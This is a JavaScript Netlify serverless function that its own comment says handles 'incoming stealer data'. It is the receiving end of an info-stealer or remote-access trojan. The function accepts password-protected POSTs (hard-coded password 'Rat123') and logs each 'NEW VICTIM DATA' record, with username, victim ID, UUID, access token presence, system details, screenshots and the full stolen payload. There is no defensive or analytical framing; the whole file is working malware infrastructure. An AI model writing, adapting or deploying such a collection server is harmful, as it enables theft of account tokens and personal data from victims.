// Netlify function for handling incoming stealer data
exports.handler = async function(event, context) {
    // Set CORS headers
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type, X-Password',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Content-Type': 'application/json'
    };

    // Handle preflight OPTIONS request
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 200,
            headers,
            body: ''
        };
    }

    // Only accept POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }

    try {
        // Parse the request body
        const body = JSON.parse(event.body);
        const { password, data } = body;

        // Check password
        if (password !== "Rat123") {
            return {
                statusCode: 401,
                headers,
                body: JSON.stringify({ error: 'Unauthorized - Invalid password' })
            };
        }

        // Log the received data (visible in Netlify logs)
        console.log('=' .repeat(50));
        console.log('🚨 NEW VICTIM DATA RECEIVED');
        console.log('=' .repeat(50));
        console.log('📅 Time:', new Date().toISOString());
        console.log('👤 Username:', data?.username || 'N/A');
        console.log('🆔 Victim ID:', data?.victim_id || 'N/A');
        console.log('🔑 UUID:', data?.uuid || 'N/A');
        console.log('🎮 Token:', data?.access_token ? 'Present' : 'None');
        
        if (data?.system_info) {
            console.log('💻 System:', data.system_info.os);
            console.log('👤 User:', data.system_info.user);
        }
        
        if (data?.screenshots) {
            console.log('📸 Screenshots:', data.screenshots.length);
        }
        
        console.log('📦 Full data:', JSON.stringify(data, null, 2));
        console.log('=' .repeat(50));

        // Return success response
        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({
                success: true,
                message: 'Data received successfully',
                timestamp: new Date().toISOString(),
                victim_id: data?.victim_id || 'unknown'
            })
        };

    } catch (error) {
        console.error('❌ Error processing request:', error);
        
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ 
                error: 'Internal server error',
                message: error.message 
            })
        };
    }
};
